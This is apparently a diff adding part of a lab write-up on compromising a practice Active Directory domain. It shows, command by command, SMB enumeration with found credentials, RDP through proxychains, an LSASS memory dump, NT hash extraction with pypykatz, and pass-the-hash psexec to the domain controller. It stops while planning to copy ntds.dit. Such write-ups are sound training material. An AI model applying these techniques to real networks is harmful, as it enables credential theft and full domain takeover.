@@ -203,4 +203,58 @@ The resulting creds are as follows
 ## stom / fails-nibble-disturb4
 ## hwilliam / warned-wobble-occur8
 ```
+Taking a look ath these creds, the only ones that are still valid are bdavid's unfortunately his credentials dont give us access to any files of interest
+```
+th@ddeu$ sudo proxychains smbclient -U "NEXURA\bdavid%caramel-cigars-reply1" -L //172.16.119.10
+--SNIP--
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        HR              Disk      
+        IPC$            IPC       Remote IPC
+        IT              Disk      
+        MANAGEMENT      Disk      
+        PRIVATE         Disk      
+        TRANSFER        Disk   
+--SNIP--
+```
+From here we can use our newly found credentials to attempt remote access to the other machines. For brevity's sake im going to omit the numerous failed attempts, but i tried psexec and xfreerdp on both other machines with both sets of credentials, and was able to get on to the JUMP01 server with bdavid via rdp.
+```
+proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:'caramel-cigars-reply1' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
+```
+A quick check shows us that bdavid is allowed to launch an administrative shell which makes our lives a lot easier. At this point we can upload mimikatz if we would like, but i wanted to try the method of dumping LSASS since for some reason it wouldnt work for me in the earlier labs using the GUI method in Task Manager
+![Lsass Dump](./20250726_lsass.PNG)
+The resulting dump was in `C:\Users\bdavid\AppData\Local\Temp\lsass.DMP` which I could move back to my machine using the drive that i mounted in the RDP command. With that out of the way I can grab new credentials using pypykatz. This is a pretty long file, but the lines of interest are here. Now we have a hash for stom
+```
+th@ddeu$ pypykatz lsa minidump lsass.DMP | less -N
+--SNIP--
+     76         == MSV ==
+     77                 Username: JUMP01$
+     78                 Domain: NEXURA
+     79                 LM: NA
+     80                 NT: fa04a67f5a8620d4ce87238f139a992b
+     81                 SHA1: 8d45e4af84cfe51b8a6f8f483e955f0b0f281abc
+     82                 DPAPI: 0000000000000000000000000000000000000000
+--SNIP--
+    293         == MSV ==
+    294                 Username: stom
+    295                 Domain: NEXURA
+    296                 LM: NA
+    297                 NT: 21ea958524cfd9a7791737f8d2f764fa
+    298                 SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+    299                 DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+--SNIP--
+```
+At this point we only have the hash and if we cant PTH with RDP unless we enable restricted admin mode, so we will have to try other methods of gaining access to the domain controller. At this point i was going to try psexec or evil-winrm and psexec is a lot easier so i went with that then i enabled restricted admin mode and conected to the machine
+```
+th@ddeu$ sudo proxychains impacket-psexec NEXURA/stom@172.16.119.10 -hashes :21ea958524cfd9a7791737f8d2f764fa
+--SNIP--
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+Now that we have access to the system we can try to grab the SYSTEM and ntds.dit files to dump them and get the administrator hash that we need to pass this lab.We can do this most easily by just creating a volume shadow copy and copying the files to our local system
 
